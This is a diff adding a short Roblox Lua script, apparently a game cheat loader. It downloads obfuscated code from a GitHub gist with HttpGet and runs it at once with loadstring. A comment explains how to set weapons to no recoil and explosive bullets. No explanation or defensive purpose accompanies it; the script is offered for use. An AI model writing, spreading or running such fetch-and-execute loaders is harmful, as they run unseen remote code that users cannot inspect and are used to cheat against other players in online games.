@@ -1,0 +1,3 @@
+loadstring(game:HttpGet(('https://gist.githubusercontent.com/GattoHow/b85425bc886f6e0c11bc27191b51c112/raw/97cabe0ab4a3650e793028669fee5eb3d76f735e/ACS%2520EDITOR%2520OBFUSCADO'),true))()
+
+--set the gun and after click in editar config set predeterminado and add no recoil and bata explosivas
